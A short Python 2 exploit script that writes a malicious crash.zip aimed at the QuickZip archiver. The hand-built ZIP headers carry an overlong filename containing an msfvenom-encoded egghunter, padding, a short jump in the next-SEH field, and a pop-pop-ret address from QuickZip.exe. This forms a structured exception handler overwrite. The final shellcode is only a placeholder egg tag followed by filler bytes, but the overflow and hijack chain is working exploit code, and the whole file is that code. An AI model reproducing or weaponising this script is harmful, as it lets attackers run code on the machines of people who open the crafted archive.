#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

shellcode = "B00BB00B" + "\x41" * 1000

# 118 bytes
# cat egghunter-B00B.bin |msfvenom -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EBX -f c
egghunter = ("\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x30\x66\x6e\x61\x5a\x6a\x6b\x4f"
"\x56\x6f\x47\x32\x52\x72\x32\x4a\x66\x62\x32\x78\x6a\x6d\x76"
"\x4e\x35\x6c\x37\x75\x52\x7a\x53\x44\x48\x6f\x6e\x58\x31\x52"
"\x44\x70\x64\x70\x57\x32\x4c\x4b\x4b\x4a\x6c\x6f\x54\x35\x69"
"\x7a\x4c\x6f\x71\x65\x68\x67\x39\x6f\x39\x77\x41\x41")

max_size = 4064
junk1 = "A" * (292 -len(egghunter))

# conditional backward jump (ZF=1) of 92bytes (\xff gets converted into \xa0) 
nseh = "\x74\xff\x41\x41"

# 0x00422833 : pop ecx # pop ebp # ret 0x04 | [QuickZip.exe]
seh = "\x33\x28\x42\x00"
payload = egghunter + junk1 + nseh + seh + shellcode + "C" * (max_size -len(egghunter) -len(junk1) -len(nseh) -len(seh) -len(shellcode))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('crash.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
